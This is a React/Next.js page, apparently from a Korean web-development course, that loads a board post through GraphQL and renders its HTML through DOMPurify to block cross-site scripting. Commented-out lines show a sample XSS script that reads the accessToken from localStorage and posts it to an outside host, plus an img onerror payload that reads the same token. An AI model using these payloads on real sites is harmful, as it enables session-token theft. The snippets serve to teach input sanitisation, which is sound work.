import { useQuery, gql } from "@apollo/client";
import { useRouter } from "next/router";
import Dompurify from "dompurify";

const FETCH_BOARD = gql`
  query fetchBoard($boardId: ID!) {
    fetchBoard(boardId: $boardId) {
      _id
      writer
      title
      contents
    }
  }
`;

export default function StaticRoutingMovedPage(): JSX.Element {
  const router = useRouter();

  const { data } = useQuery(FETCH_BOARD, {
    variables: { boardId: router.query.qqq },
  });

  return (
    <div>
      {/* <div>{router.query.qqq}번 게시글 이동이 완료되었습니다.</div> */}
      <div>작성자: {data?.fetchBoard?.writer}</div>
      <div>제목: {data?.fetchBoard?.title}</div>
      {/* <div>내용: {data?.fetchBoard?.contents}</div> */}
      {/* <div
        dangerouslySetInnerHTML={{
          __html: `
              <script>
                const qqq = localStorage.getItem("accessToken")
                axios.post("http://mybackerbackend.com/mydata", {data: qqq}) 이거는 해커가 해킹하는 방식임!! 요 안에 스크립트 태그를 넣어서 자바스크립트로 토큰 값 가져오고 등등 해킹함!! 
              </script>
          `,
        }}
      /> */}
      {typeof window !== "undefined" && (
        <div
          dangerouslySetInnerHTML={{
            __html: Dompurify.sanitize(data?.fetchBoard?.contents),
          }}
        />
      )}
    </div>
  );
}

// playground XSS 공격
// <img src='#' onerror='console.log(localStorage.getItem(\"accessToken\"))' />
// playground XSS 공격
// <img src='#' onerror='console.log(localStorage.getItem(\"accessToken\"))' />

// import { useQuery, gql } from "@apollo/client";
// import { useRouter } from "next/router";
// import Dompurify from "dompurify";

// const FETCH_BOARD = gql`
//   query fetchBoard($boardId: ID!) {
//     fetchBoard(boardId: $boardId) {
//       _id
//       writer
//       title
//       contents
//     }
//   }
// `;

// export default function StaticRoutingMovedPage(): JSX.Element {
//   const router = useRouter();
//   const { data } = useQuery(FETCH_BOARD, {
//     variables: { boardId: router.query.qqq },
//   });

//   // const myhtml = {
//   //   __html: data?.fetchBoard?.contents.
//   // } 이거를 아래 태그에 바로 넣음

//   return (
//     <div>
//       <div>작성자 : {data?.fetchBoard?.writer}</div>
//       <div>제목: {data?.fetchBoard?.title}</div>
//       {/* <div>내용: {data?.fetchBoard?.contents}</div>  */}
//       {typeof window !== "undefined" && (
//         <div
//           dangerouslySetInnerHTML={{
//             __html: Dompurify.sanitize(data?.fetchBoard?.contents),
//           }}
//         ></div>
//       )}
//     </div>
//   );
// }
